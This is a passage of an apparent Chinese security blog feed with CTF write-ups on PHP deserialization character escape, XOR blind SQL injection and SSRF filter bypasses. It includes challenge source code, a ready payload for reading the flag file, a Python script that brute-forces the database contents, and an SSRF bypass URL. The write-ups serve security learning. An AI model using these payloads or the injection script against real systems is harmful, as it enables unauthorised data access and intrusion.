class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取出关键信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET 传参 f phpinfo  得到信息 d0g3_f1ag.php</p><p>show_image进行反序列化 <strong>$userinfo[‘img’]是flag.php的base64加密</strong></p><p>filter函数进行过滤 会将字符串的特定字符为空由此(字符逃逸)</p><p>看到unset销毁$_SESSION 重新赋值 </p><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>即会将之前$_SESSION存在的变量全部移除</p><p>post</p><p>ZDBnM19mMWFnLnBocA==也就是d0g3_f1ag.php的base64加密。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line"><span class="comment">#最后为</span></span><br><span class="line"><span class="string">&quot;a:2:&#123;s:7:&quot;</span>phpflag<span class="string">&quot;;s:48:&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot; ;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>经过filter过滤后phpflag就会被替换成空，</p><p>s:7:”phpflag”;s:48:” 就变成了 s:7:””;s:48:”;即完成了逃逸。</p><p>两个键值分别被序列化成了</p><p>s:7:””;s:48:”;s:1:”1”;即键名叫”;s:48: 对应的值为一个字符串1。这个键值对只要能瞒天过海就行。</p><p>s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;键名img对应的字符串是d0g3_f1ag.php的base64编码。</p><p><code>得到</code></p><p>$flag = ‘flag in /d0g3_fllllllag’;</p><p>base64加密  L2QwZzNfZmxsbGxsbGFn</p><p>得出flag</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php序列化 </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 华北赛区 Day2 Web1]Hack World</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SQL%E6%B3%A8%E5%85%A5/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SQL%E6%B3%A8%E5%85%A5/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>异或注入</li></ul><p>一开始就给出了我们所需的表名和列名，然后提交一个id</p><p>当提交1和2的时候，查询出了两句，其他则报错</p><p>尝试输入一些常规的sql注入查询语句，结果都被过滤了</p><p>显示 <em>SQL Injection Checked.</em></p><p>尝试<strong>异或注入</strong>，输入1^1^1，返回了id=1的结果</p><p><strong>输入1^(ascii(substr((select(flag)from(flag)),1,1))&gt;x)^1，这里x是一个未知数，不断改变x的值，便可根据回显逐渐爆破出flag</strong></p><p>大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://d7b94d40-8ccb-4ead-9ace-89662e7f29c7.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">43</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">127</span>):</span><br><span class="line">        s = (<span class="built_in">int</span>)((<span class="built_in">max</span>+<span class="built_in">min</span>)/<span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">&#x27;1^(ascii(substr((select(flag)from(flag)),&#x27;</span> + \</span><br><span class="line">            <span class="built_in">str</span>(i)+<span class="string">&#x27;,1))&gt;&#x27;</span>+<span class="built_in">str</span>(s)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        r = requests.post(url, data=&#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(r.content):</span><br><span class="line">            <span class="built_in">max</span> = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = s</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">max</span>-<span class="built_in">min</span>) &lt;= <span class="number">1</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">max</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[第二章 web进阶]SSRF Training</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/N1Book/%5B%E7%AC%AC%E4%BA%8C%E7%AB%A0%20web%E8%BF%9B%E9%98%B6%5DSSRF%20Training/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/N1Book/%5B%E7%AC%AC%E4%BA%8C%E7%AB%A0%20web%E8%BF%9B%E9%98%B6%5DSSRF%20Training/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init(); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close(<span class="variable">$ch</span>); </span><br><span class="line">        var_dump(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    safe_request_url(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$url=<a href="http://a:%40127.0.0.1%3A80@baidu.com/flag.php">http://a:@127.0.0.1:80@baidu.com/flag.php</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[De1CTF 2019]SSRF Me</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSRF/%5BDe1CTF%202019%5DSSRF%20Me/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSRF/%5BDe1CTF%202019%5DSSRF%20Me/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower() </span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):<span class="comment">#检测是以指定字符开头，不能用这两个协议</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>审计一下源码 这三个是要传的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br></pre></td></tr></table></figure><p>将三个参数传入TASK类中 调用TASK类中的EXEC方法</p><p>分析下三个参数：<br>第一个参数action是传入read和scan的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需要read 才能读取</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">               